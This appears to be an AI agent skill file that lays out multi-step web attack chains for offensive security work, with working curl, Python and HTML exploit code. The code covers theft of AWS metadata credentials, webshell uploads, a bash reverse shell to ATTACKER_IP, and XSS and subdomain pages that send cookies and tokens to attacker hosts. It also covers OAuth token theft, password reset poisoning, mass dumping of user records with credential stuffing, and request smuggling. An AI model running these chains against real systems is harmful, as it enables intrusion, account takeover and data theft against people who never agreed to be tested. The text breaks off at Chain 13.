---
name: chain-detection
description: Vulnerability chain detection and exploitation methodology for authorized offensive security engagements. Contains 38+ named attack chains with prerequisites, step-by-step exploitation, curl/Python PoC commands, CVSS scores, detection bypass tips, ASCII chain diagrams, chain scoring algorithm, and a complete worked SaaS app example (JWT+GraphQL+SSRF+cloud metadata). Load when planning multi-step exploitation or looking for vulnerability chains.
---

# CHAIN DETECTION SKILL

Multi-step vulnerability chain methodology for authorized offensive security engagements.

## CHAIN SCORING ALGORITHM

```python
def score_chain(auth_required, num_steps, impact, exploitability, reliability):
    """
    auth_required:  0=unauthenticated, 1=low-priv, 2=high-priv
    num_steps:      number of links (fewer = better)
    impact:         1-10 (10 = full compromise / RCE as root)
    exploitability: 1-10 (10 = trivial, reliable)
    reliability:    0-100 percent success rate
    Returns priority score — higher = attempt first
    """
    auth_bonus = [3.0, 2.0, 1.0][min(auth_required, 2)]
    step_penalty = max(0, num_steps - 2) * 0.3
    score = (impact * exploitability * auth_bonus * (reliability / 100.0)) - step_penalty
    return round(score, 1)

# Prioritized chain queue
chains = [
    ("SSRF→AWS Metadata→Full Cloud",          0, 3, 10,  8, 85),
    ("SQLi→File Read→Cred→SSH RCE",            0, 4, 10,  7, 70),
    ("JWT None Alg→Admin→RCE via Admin",        1, 3, 10,  9, 90),
    ("XSS Stored→Admin Session→RCE",           0, 4,  9,  6, 60),
    ("XXE→SSRF→Cloud Metadata→Credentials",    0, 4, 10,  7, 75),
    ("OAuth Misconfig→Account Takeover",        0, 3,  9,  8, 80),
    ("Subdomain Takeover→Cookie Theft→ATO",    0, 3,  9,  8, 70),
    ("Open Redirect→OAuth Token Theft→ATO",    0, 3,  9,  7, 75),
    ("Password Reset Poisoning→ATO",           0, 2,  9,  8, 85),
    ("GraphQL Introspect→Mass Assign→Privesc", 1, 3,  8,  7, 80),
    ("HTTP Smuggling→Cache Poison→XSS→ATO",    0, 4,  9,  5, 55),
    ("Race Condition→Negative Balance",        1, 2,  7,  8, 70),
    ("Mass Assignment→Admin Role→RCE",         1, 3, 10,  7, 75),
    ("LFI→Log Poison→RCE",                     0, 3, 10,  7, 65),
    ("Path Traversal→Config→Creds→RCE",        0, 3, 10,  8, 70),
]

print("=== CHAIN PRIORITY QUEUE ===")
scored = sorted([(score_chain(*c[1:]), c[0]) for c in chains], reverse=True)
for score, name in scored:
    print(f"  [{score:5.1f}] {name}")
```

## ASCII CHAIN DIAGRAM FORMAT

```
CHAIN: [Name]
CVSS: [score] | AUTH: [None/Low/High] | RELIABILITY: [%]

[Step 1 Vuln]
     |
     | [what you gain]
     v
[Step 2 Vuln]
     |
     | [what you gain]
     v
[Step 3 Vuln]
     |
     | [final impact]
     v
[OBJECTIVE: RCE / ATO / Data Exfil / etc]
```

---

## CHAIN 1 — SSRF → AWS METADATA → CLOUD CREDENTIALS → FULL CLOUD COMPROMISE

```
SSRF (unauthenticated)
     |
     | fetch http://169.254.169.254/
     v
AWS IMDSv1 metadata service
     |
     | extract IAM role credentials (AccessKeyId, SecretAccessKey, Token)
     v
AWS CLI with stolen credentials
     |
     | enumerate S3, EC2, RDS, Secrets Manager, Lambda
     v
FULL CLOUD COMPROMISE (data exfil, persistence, lateral movement)
```

**CVSS:** 9.8 | **Auth:** None | **Reliability:** 85%

**Prerequisites:** SSRF in app, AWS IMDSv1 enabled (no hop limit enforcement), IAM role attached to instance

```bash
TARGET_URL="https://target.com"

# Step 1: Find SSRF
# Test common SSRF parameters
for param in url src redirect dest uri target next callback image link feed import; do
  RESP=$(curl -s "${TARGET_URL}/?${param}=http://169.254.169.254/latest/meta-data/")
  echo "$RESP" | grep -qiE "ami-id|instance-id|iam\|local-hostname" && \
    echo "[SSRF] Parameter: $param" | tee -a ssrf_aws_chain.txt
done

# Test in POST JSON body
curl -s -X POST "${TARGET_URL}/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' | tee ssrf_post_test.txt

# Test SSRF via PDF/image generation
curl -s -X POST "${TARGET_URL}/api/screenshot" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' | tee ssrf_pdf_test.txt

# Step 2: Enumerate AWS metadata
for path in \
  "latest/meta-data/" \
  "latest/meta-data/iam/" \
  "latest/meta-data/iam/security-credentials/" \
  "latest/meta-data/iam/info" \
  "latest/meta-data/hostname" \
  "latest/meta-data/instance-id" \
  "latest/meta-data/local-ipv4" \
  "latest/meta-data/public-ipv4" \
  "latest/dynamic/instance-identity/document" \
  "latest/user-data"; do
  RESP=$(curl -s "${TARGET_URL}/api/fetch?url=http://169.254.169.254/$path")
  [ -n "$RESP" ] && echo "=== $path ===" | tee -a aws_meta.txt && echo "$RESP" >> aws_meta.txt
done

# Step 3: Get IAM role name, then credentials
ROLE_NAME=$(curl -s "${TARGET_URL}/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | tr -d ' \n')
echo "IAM Role: $ROLE_NAME"
CREDS=$(curl -s "${TARGET_URL}/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")
echo "$CREDS" | tee aws_credentials.txt

# Extract creds
ACCESS_KEY=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('AccessKeyId',''))" 2>/dev/null)
SECRET_KEY=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('SecretAccessKey',''))" 2>/dev/null)
TOKEN=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('Token',''))" 2>/dev/null)
echo "ACCESS_KEY=$ACCESS_KEY SECRET_KEY=[REDACTED] TOKEN=[REDACTED]"

# Step 4: Use credentials with AWS CLI
export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
export AWS_SESSION_TOKEN="$TOKEN"

aws sts get-caller-identity | tee aws_identity.txt
aws s3 ls | tee aws_s3_buckets.txt
aws ec2 describe-instances --output table | tee aws_ec2.txt
aws secretsmanager list-secrets | tee aws_secrets.txt
aws secretsmanager get-secret-value --secret-id $(aws secretsmanager list-secrets | jq -r '.SecretList[0].ARN') | tee aws_secret_value.txt
aws iam list-users | tee aws_iam_users.txt
aws rds describe-db-instances | tee aws_rds.txt
aws lambda list-functions | tee aws_lambda.txt

# IMDSv2 bypass (requires token first)
IMDSv2_TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Then use SSRF to send PUT with that header — most SSRF only allows GET
# Try via redirects if GET-only SSRF
```

**Detection bypass:** Use SSRF via redirects (302 to 169.254.169.254), DNS rebinding, protocol confusion (dict://, file://, gopher://), IPv6 representation (http://[::ffff:169.254.169.254]/)

---

## CHAIN 2 — SQLI → FILE READ → CREDENTIAL DISCOVERY → RCE

```
SQL Injection (unauthenticated)
     |
     | LOAD_FILE() or COPY TO / INTO OUTFILE
     v
Read /etc/passwd, web root config files, .env
     |
     | extract DB creds, SSH keys, app secrets
     v
SSH access / database access / app admin
     |
     | execute OS commands via db, admin panel, or SSH
     v
RCE AS www-data / root
```

**CVSS:** 9.9 | **Auth:** None | **Reliability:** 70%

```bash
TARGET_URL="https://target.com/api/products"

# Step 1: Confirm SQLi
sqlmap -u "$TARGET_URL?id=1" --batch --level=3 --risk=2 -o --output-dir=/tmp/sqlmap | tee sqli_confirm.txt

# Step 2: File read (MySQL LOAD_FILE)
sqlmap -u "$TARGET_URL?id=1" --batch --file-read="/etc/passwd" --output-dir=/tmp/sqlmap | tee sqli_fileread.txt
sqlmap -u "$TARGET_URL?id=1" --batch --file-read="/var/www/html/.env" --output-dir=/tmp/sqlmap | tee sqli_env.txt
sqlmap -u "$TARGET_URL?id=1" --batch --file-read="/var/www/html/wp-config.php" --output-dir=/tmp/sqlmap | tee sqli_wpconfig.txt

# Manual UNION-based file read (MySQL)
curl -s "${TARGET_URL}?id=1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -" | tee sqli_manual_read.txt

# PostgreSQL — copy from file
# 1 UNION SELECT pg_read_file('/etc/passwd'),NULL-- -

# Step 3: Write webshell (if FILE privilege exists)
sqlmap -u "$TARGET_URL?id=1" --batch \
  --file-write="/tmp/shell.php" \
  --file-dest="/var/www/html/uploads/shell.php" \
  --output-dir=/tmp/sqlmap | tee sqli_write.txt

# Manual INTO OUTFILE
curl -s "${TARGET_URL}?id=1 UNION SELECT '<?php system(\$_GET[cmd]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -"

# Step 4: Execute RCE
curl -s "https://target.com/shell.php?cmd=id" | tee rce_confirm.txt
curl -s "https://target.com/shell.php?cmd=cat+/etc/shadow" | tee rce_shadow.txt

# Reverse shell via webshell
LHOST="ATTACKER_IP"
LPORT="4444"
curl -s "https://target.com/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
```

---

## CHAIN 3 — STORED XSS → ADMIN SESSION THEFT → AUTHENTICATED RCE

```
Stored XSS (low-priv user)
     |
     | JavaScript payload steals admin cookie/token
     v
Admin session token captured (via Burp Collaborator / webhook)
     |
     | use admin session to access privileged panel
     v
Admin functionality (file upload, template edit, plugin install)
     |
     | upload webshell / execute server-side template / install malicious plugin
     v
RCE on server
```

**CVSS:** 9.0 | **Auth:** Low-priv | **Reliability:** 60%

```bash
TARGET_URL="https://target.com"
COLLAB="YOUR.burpcollaborator.net"

# Step 1: Plant stored XSS
# Try comment, profile, name, bio, address fields
XSS_PAYLOAD="<script>document.location='https://$COLLAB/?c='+document.cookie</script>"
# HTML entity bypass
XSS_PAYLOAD2="<img src=x onerror=\"fetch('https://$COLLAB/?c='+btoa(document.cookie))\">"
# DOM-based
XSS_PAYLOAD3="<script>var x=new XMLHttpRequest();x.open('GET','https://$COLLAB/?c='+encodeURIComponent(document.cookie),true);x.send()</script>"
# CSP bypass with script-src 'unsafe-inline'
XSS_PAYLOAD4="<script>navigator.sendBeacon('https://$COLLAB',JSON.stringify({c:document.cookie,t:localStorage.getItem('token')}))</script>"

curl -s -X POST "$TARGET_URL/api/comment" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d "{\"text\":\"$XSS_PAYLOAD2\",\"post_id\":1}" | tee xss_plant.txt

# Step 2: Wait for admin to trigger — monitor Collaborator
echo "Monitor https://$COLLAB for incoming requests containing cookie"

# Step 3: Use stolen admin session
ADMIN_TOKEN="STOLEN_FROM_COLLABORATOR"
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" "$TARGET_URL/api/admin/users" | jq . | tee admin_access.txt

# Step 4: RCE via admin file upload
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])){
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
}
?>
EOF

curl -s -X POST "$TARGET_URL/admin/upload" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -F "file=@/tmp/shell.php;type=image/jpeg;filename=image.jpg.php" | tee admin_upload.txt

# Step 4b: RCE via template editor
curl -s -X POST "$TARGET_URL/api/admin/template/edit" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template":"shell.php","content":"<?php system($_GET[cmd]); ?>"}' | tee admin_template.txt

curl -s "$TARGET_URL/shell.php?cmd=id" | tee rce_admin_chain.txt
```

---

## CHAIN 4 — LFI → LOG POISONING → RCE

```
Local File Inclusion
     |
     | include Apache/Nginx access log or /proc/self/environ
     v
Inject PHP code into log via User-Agent header
     |
     | LFI includes poisoned log → PHP executes
     v
RCE
```

**CVSS:** 9.8 | **Auth:** None | **Reliability:** 65%

```bash
TARGET_URL="https://target.com/page.php"

# Step 1: Confirm LFI
for lfi in \
  "../../../../etc/passwd" \
  "../../../../etc/passwd%00" \
  "....//....//....//etc/passwd" \
  "..%2F..%2F..%2F..%2Fetc%2Fpasswd" \
  "php://filter/convert.base64-encode/resource=/etc/passwd" \
  "php://filter/read=string.rot13/resource=/etc/passwd"; do
  RESP=$(curl -s "${TARGET_URL}?file=$lfi")
  echo "$RESP" | grep -q "root:" && echo "[LFI CONFIRMED] $lfi" | tee -a lfi_confirm.txt
done

# Step 2: Identify log files
for logpath in \
  "../../../../var/log/apache2/access.log" \
  "../../../../var/log/apache/access.log" \
  "../../../../var/log/nginx/access.log" \
  "../../../../var/log/httpd/access_log" \
  "../../../../proc/self/environ" \
  "../../../../var/log/mail.log" \
  "../../../../var/log/vsftpd.log" \
  "../../../../tmp/sess_SESSIONID"; do
  RESP=$(curl -s "${TARGET_URL}?file=$logpath")
  [ -n "$RESP" ] && echo "[LOG] $logpath accessible" | tee -a lfi_logs.txt
done

# Step 3: Poison log with PHP via User-Agent
PHP_PAYLOAD='<?php system($_GET["cmd"]); ?>'
curl -s "$TARGET_URL" -A "$PHP_PAYLOAD" > /dev/null
echo "PHP code injected into User-Agent → log"

# Step 4: Include poisoned log
curl -s "${TARGET_URL}?file=../../../../var/log/apache2/access.log&cmd=id" | tee lfi_rce.txt
# Or via /proc/self/environ
curl -s "$TARGET_URL" -A "$PHP_PAYLOAD" > /dev/null
curl -s "${TARGET_URL}?file=../../../../proc/self/environ&cmd=id" | tee lfi_proc_rce.txt

# PHP wrappers for RCE
# PHP://input
curl -s -X POST "${TARGET_URL}?file=php://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "<?php system('id'); ?>" | tee lfi_phpinput.txt

# data:// wrapper
curl -s "${TARGET_URL}?file=data://text/plain;base64,$(echo '<?php system($_GET["cmd"]); ?>' | base64 -w0)&cmd=id" | tee lfi_data.txt
```

---

## CHAIN 5 — OPEN REDIRECT → OAUTH TOKEN THEFT → ACCOUNT TAKEOVER

```
Open Redirect on OAuth callback endpoint
     |
     | redirect_uri with open redirect chains to attacker server
     v
OAuth authorization code or access token leaked in Referer/URL
     |
     | exchange code for tokens or use access token directly
     v
Full account takeover
```

**CVSS:** 8.8 | **Auth:** None | **Reliability:** 75%

```bash
TARGET_URL="https://target.com"
ATTACKER="https://evil.com"
CLIENT_ID="discovered_client_id"

# Step 1: Find open redirect on target
for param in next url redirect return_to continue dest destination after_login; do
  LOC=$(curl -sI "${TARGET_URL}/?${param}=https://evil.com" -o /dev/null -w "%{redirect_url}")
  echo "$LOC" | grep -q "evil.com" && \
    echo "[REDIRECT] param=$param -> $LOC" | tee -a open_redirect.txt
done

# Also check callback/redirect endpoints
for path in /redirect /out /go /link /callback /auth/callback /oauth/callback; do
  for param in url next dest to; do
    LOC=$(curl -sI "${TARGET_URL}${path}?${param}=https://evil.com" -o /dev/null -w "%{redirect_url}")
    echo "$LOC" | grep -q "evil.com" && \
      echo "[REDIRECT] ${path}?${param}=..." | tee -a open_redirect.txt
  done
done

# Step 2: Chain with OAuth — use open redirect as redirect_uri
AUTHZ_URL="https://auth.target.com/oauth/authorize"
# Victim clicks this link, gets token redirected to attacker
MALICIOUS_URL="${AUTHZ_URL}?response_type=token&client_id=${CLIENT_ID}&redirect_uri=${TARGET_URL}/callback?next=https://evil.com&scope=openid profile"
echo "Social engineering link: $MALICIOUS_URL" | tee oauth_chain.txt

# Step 3: Capture token from evil.com server logs
# On attacker.com, run: python3 -m http.server 80
# Token arrives as: GET /?access_token=TOKEN&token_type=bearer

# Step 4: Use stolen token
STOLEN_TOKEN="TOKEN_FROM_ATTACKER_SERVER"
curl -s -H "Authorization: Bearer $STOLEN_TOKEN" "$TARGET_URL/api/user/me" | jq . | tee ato_confirm.txt
curl -s -X POST "$TARGET_URL/api/user/email" \
  -H "Authorization: Bearer $STOLEN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}' | tee ato_email_change.txt
```

---

## CHAIN 6 — PASSWORD RESET POISONING → ACCOUNT TAKEOVER

```
Password reset functionality
     |
     | inject X-Forwarded-Host: attacker.com in reset request
     v
Reset link sent to victim with attacker's domain
     |
     | victim clicks link → token sent to attacker server
     v
Attacker uses token to reset victim password → Account Takeover
```

**CVSS:** 9.0 | **Auth:** None | **Reliability:** 85%

```bash
TARGET_URL="https://target.com"
VICTIM_EMAIL="admin@target.com"

# Step 1: Trigger password reset with poisoned host header
curl -s -X POST "$TARGET_URL/api/forgot-password" \
  -H "Content-Type: application/json" \
  -H "Host: attacker.com" \
  -d "{\"email\":\"$VICTIM_EMAIL\"}" | tee pwreset_host.txt

# Also try X-Forwarded-Host
curl -s -X POST "$TARGET_URL/api/forgot-password" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-Host: attacker.com" \
  -d "{\"email\":\"$VICTIM_EMAIL\"}" | tee pwreset_xfh.txt

# Try X-Original-URL and Forwarded
curl -s -X POST "$TARGET_URL/api/forgot-password" \
  -H "Content-Type: application/json" \
  -H "Forwarded: host=attacker.com" \
  -d "{\"email\":\"$VICTIM_EMAIL\"}" | tee pwreset_forwarded.txt

# Step 2: Victim clicks link — token arrives at attacker server
# Attacker.com receives: GET /reset?token=ABCDEF123456

# Step 3: Use token to reset password
RESET_TOKEN="TOKEN_FROM_ATTACKER_SERVER"
curl -s -X POST "$TARGET_URL/api/reset-password" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$RESET_TOKEN\",\"password\":\"NewPass123!\",\"confirm\":\"NewPass123!\"}" \
  | tee pwreset_ato.txt

# Step 4: Login with new password
curl -s -X POST "$TARGET_URL/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$VICTIM_EMAIL\",\"password\":\"NewPass123!\"}" \
  | tee ato_login.txt
```

---

## CHAIN 7 — SUBDOMAIN TAKEOVER → COOKIE THEFT → SESSION HIJACKING

```
Dangling CNAME for sub.target.com
     |
     | register the dangling service (GitHub Pages / Heroku / S3)
     v
Serve malicious page from sub.target.com
     |
     | JS reads cookies set for *.target.com (if not HttpOnly)
     | or sets cookies for .target.com
     v
Victim visits sub.target.com → cookies stolen → Session Hijack
```

**CVSS:** 8.8 | **Auth:** None | **Reliability:** 70%

```bash
# Step 1: Identify takeover candidate (from web-recon phase)
DANGLING_SUB="staging.target.com"  # CNAME -> deleted-app.herokuapp.com

# Step 2: Register the service
# For Heroku:
heroku create staging-target-com
heroku domains:add staging.target.com --app staging-target-com
# DNS: staging.target.com CNAME -> staging-target-com.herokuapp.com

# Step 3: Host cookie-stealing page
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Staging</title></head>
<body>
<script>
// Steal cookies accessible from this subdomain
var stolen = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    origin: document.domain
};
fetch('https://attacker.com/steal?' + new URLSearchParams(stolen));

// Also try to set malicious cookie for parent domain
document.cookie = "session=ATTACKER_SESSION; domain=.target.com; path=/; SameSite=Lax";
</script>
<p>Loading...</p>
</body>
</html>
EOF

# Step 4: Phish victim with sub.target.com link
# "Please verify your account at staging.target.com"

# Step 5: Use stolen session
STOLEN_SESSION="CAPTURED_FROM_ATTACKER_SERVER"
curl -s -H "Cookie: session=$STOLEN_SESSION" "$TARGET_URL/api/user/me" | jq . | tee sub_takeover_ato.txt
```

---

## CHAIN 8 — XXE → SSRF → INTERNAL METADATA → CLOUD CREDENTIALS → FULL COMPROMISE

```
XXE in XML upload / SAML / SVG
     |
     | XXE with SSRF to internal HTTP endpoint
     v
AWS Instance Metadata Service (169.254.169.254)
     |
     | extract IAM role credentials
     v
AWS CLI with stolen credentials
     |
     | full cloud resource access
     v
Data exfiltration + persistence + lateral movement
```

**CVSS:** 9.9 | **Auth:** None | **Reliability:** 75%

```bash
COLLAB="YOUR.collaborator.net"
TARGET_URL="https://target.com"

# Step 1: Confirm XXE with OOB
cat > xxe_oob.xml << EOF
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://$COLLAB/xxe_probe">
  %xxe;
]>
<root><data>test</data></root>
EOF
curl -s -X POST "$TARGET_URL/api/import" \
  -H "Content-Type: application/xml" --data-binary @xxe_oob.xml | tee xxe_probe.txt

# Step 2: SSRF to metadata service via XXE
cat > xxe_aws.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>
EOF
ROLE=$(curl -s -X POST "$TARGET_URL/api/import" \
  -H "Content-Type: application/xml" --data-binary @xxe_aws.xml | grep -oP "[A-Za-z0-9_-]+" | tail -1)
echo "IAM Role: $ROLE"

# Step 3: Get credentials
cat > xxe_creds.xml << EOF
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE">
]>
<root><data>&xxe;</data></root>
EOF
CREDS=$(curl -s -X POST "$TARGET_URL/api/import" \
  -H "Content-Type: application/xml" --data-binary @xxe_creds.xml)
echo "Credentials: $CREDS" | tee xxe_aws_creds.txt

# Step 4: Use creds (same as Chain 1 Step 4)
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['AccessKeyId'])" 2>/dev/null)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['SecretAccessKey'])" 2>/dev/null)
export AWS_SESSION_TOKEN=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['Token'])" 2>/dev/null)
aws sts get-caller-identity | tee xxe_aws_identity.txt
aws s3 ls | tee xxe_s3_buckets.txt
aws secretsmanager list-secrets | tee xxe_secrets.txt
```

---

## CHAIN 9 — IDOR → PII EXFILTRATION → CREDENTIAL STUFFING → FURTHER COMPROMISE

```
IDOR on /api/user/{id} (low-priv user)
     |
     | iterate IDs 1-10000, dump all user objects
     v
PII + hashed passwords extracted
     |
     | crack hashes offline (hashcat), or use email:pass pairs
     v
Credential stuffing against admin panel, email, VPN
     |
     | admin account found → full app compromise
```

**CVSS:** 8.5 | **Auth:** Low-priv | **Reliability:** 80%

```python
# idor_dump.py
import requests, json, time

TARGET = "https://target.com"
TOKEN = "VALID_USER_TOKEN"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}
OUTPUT = "idor_dump.json"

results = []
for uid in range(1, 5001):
    r = requests.get(f"{TARGET}/api/user/{uid}", headers=HEADERS, timeout=10)
    if r.status_code == 200:
        data = r.json()
        results.append(data)
        print(f"[+] uid={uid}: {data.get('email','')} {data.get('role','')}")
        if len(results) % 100 == 0:
            json.dump(results, open(OUTPUT, 'w'), indent=2)
    elif r.status_code == 429:
        print(f"Rate limited at uid={uid}, sleeping 5s")
        time.sleep(5)
    time.sleep(0.05)  # avoid rate limit

json.dump(results, open(OUTPUT, 'w'), indent=2)
print(f"\nDumped {len(results)} users to {OUTPUT}")

# Extract emails and password hashes
with open(OUTPUT) as f:
    users = json.load(f)
emails = [u.get('email','') for u in users if u.get('email')]
hashes = [u.get('password','') or u.get('passwordHash','') for u in users if u.get('password') or u.get('passwordHash')]
open('emails.txt','w').write('\n'.join(emails))
open('hashes.txt','w').write('\n'.join(hashes))
print(f"Emails: {len(emails)}, Hashes: {len(hashes)}")
```

```bash
# Crack hashes
hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt 2>/dev/null    # MD5
hashcat -a 0 -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt 2>/dev/null # bcrypt
hashcat -a 0 -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt 2>/dev/null # SHA256

# Credential stuffing against admin panel
hydra -C <(paste -d: emails.txt cracked_passwords.txt) target.com https-post-form \
  "/api/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid credentials" -t 5
```

---

## CHAIN 10 — CORS MISCONFIGURATION → CSRF → ACCOUNT TAKEOVER

```
CORS wildcard or reflected origin (with credentials)
     |
     | evil.com JS makes credentialed cross-origin requests
     v
Read sensitive API responses (tokens, user data, CSRF tokens)
     |
     | use extracted CSRF token to perform state-changing action
     v
Account takeover / data theft
```

**CVSS:** 8.8 | **Auth:** None (victim must be logged in) | **Reliability:** 75%

```html
<!-- Serve from attacker.com — victim visits this page while logged into target.com -->
<!-- cors_exploit.html -->
<!DOCTYPE html>
<html>
<head><title>CORS Exploit</title></head>
<body>
<script>
const TARGET = "https://target.com";
const ATTACKER = "https://attacker.com";

async function exploit() {
    // Step 1: Read sensitive data via CORS
    let resp = await fetch(`${TARGET}/api/user/me`, {credentials: 'include'});
    let data = await resp.json();
    console.log("User data:", data);

    // Step 2: Extract CSRF token
    let csrfResp = await fetch(`${TARGET}/api/csrf-token`, {credentials: 'include'});
    let csrfData = await csrfResp.json();
    let csrfToken = csrfData.token;

    // Step 3: Change email (account takeover)
    let changeResp = await fetch(`${TARGET}/api/user/email`, {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken},
        body: JSON.stringify({email: 'attacker@evil.com'})
    });

    // Step 4: Exfiltrate everything
    await fetch(`${ATTACKER}/steal`, {
        method: 'POST',
        body: JSON.stringify({user: data, csrf: csrfToken, email_change: await changeResp.text()})
    });
}

exploit().catch(e => fetch(`${ATTACKER}/error?msg=${e.message}`));
</script>
<p>Please wait...</p>
</body>
</html>
```

---

## CHAIN 11 — HTTP REQUEST SMUGGLING → CACHE POISONING → STORED XSS → ADMIN TAKEOVER

```
HTTP Request Smuggling (CL.TE)
     |
     | smuggle request that poisons shared cache
     v
Cached response contains XSS payload
     |
     | admin loads cached page with XSS
     v
Admin cookie/token stolen → admin session
     |
     | admin panel RCE via file upload / template exec
     v
FULL COMPROMISE
```

**CVSS:** 9.0 | **Auth:** None | **Reliability:** 45%

```python
# smuggle_cache_xss.py
import socket, ssl, time

HOST = "target.com"
PORT = 443
COLLAB = "YOUR.collaborator.net"

XSS = f"<script>document.location='https://{COLLAB}/?c='+document.cookie</script>"

# CL.TE: frontend uses CL, backend uses TE
# Smuggle a GET request that will be served from cache with XSS in response
smuggle_request = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: 150\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"0\r\n"
    f"\r\n"
    f"GET /404-page HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"X-Injected: {XSS}\r\n"
    f"Content-Length: 5\r\n"
    f"\r\n"
    f"x=1"
).encode()

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

print("Sending smuggled request...")
with socket.create_connection((HOST, PORT)) as s:
    with ctx.wrap_socket(s, server_hostname=HOST) as ss:
        ss.sendall(smuggle_request)
        time.sleep(3)
        print(ss.recv(4096).decode(errors='replace')[:500])

# Follow up request to see if XSS is in cached response
import requests
resp = requests.get(f"https://{HOST}/404-page", headers={"X-Injected": "test"})
print(f"Cache response: {resp.text[:300]}")
```

---

## CHAIN 12 — GRAPHQL INTROSPECTION → MASS ASSIGNMENT → PRIVILEGE ESCALATION

```
GraphQL introspection enabled
     |
     | discover mutation arguments including privileged fields (role, isAdmin)
     v
Mass assignment via mutation
     |
     | updateUser(id: OWN_ID, role: "admin") accepted
     v
Admin privileges → access to admin queries/mutations
     |
     | admin mutations expose server-side operations → RCE
```

**CVSS:** 9.1 | **Auth:** Low-priv | **Reliability:** 80%

```bash
GRAPHQL="https://target.com/graphql"
TOKEN="LOW_PRIV_USER_TOKEN"

# Step 1: Introspect schema
curl -s -X POST $GRAPHQL \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind } } } } }"}' \
  | jq . | tee gql_schema.txt

# Extract mutation fields that look privileged
cat gql_schema.txt | python3 -c "
import json,sys
d=json.load(sys.stdin)
for t in d.get('data',{}).get('__schema',{}).get('types',[]):
    if 'Mutation' in t.get('name',''):
        for f in t.get('fields',[]) or []:
            print(f['name'])
" | tee gql_mutations.txt

# Step 2: Look for updateUser / editProfile with role/isAdmin arguments
curl -s -X POST $GRAPHQL \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { updateUser(id: \"MYID\", role: \"admin\") { id role } }"}' \
  | tee gql_massassign.txt

curl -s -X POST $GRAPHQL \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { updateProfile(userId: \"MYID\", isAdmin: true, plan: \"enterprise\") { id isAdmin } }"}' \
  | tee gql_privesc.txt

# Step 3: Verify elevated access
curl -s -X POST $GRAPHQL \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ adminPanel { users { id email role } systemConfig { debug } } }"}' \
  | tee gql_admin_verify.txt

# Step 4: Admin mutations for RCE
curl -s -X POST $GRAPHQL \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { runDiagnostic(command: \"id\") { output } }"}' | tee gql_rce.txt
curl -s -X POST $GRAPHQL \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { executeQuery(sql: \"SELECT load_file('/etc/passwd')\") { rows } }"}' | tee gql_sqli.txt
```

---

## CHAIN 13 — JWT NONE ALGORITHM → ADMIN ACCESS → RCE

```
JWT accepted with alg: none (no signature verification)
     |
     | forge JWT with role: "admin", alg: none
     v
Admin API access
     |
     | admin endpoints expose file upload, exec, template, or SSRF
     v
RCE or full data dump
```

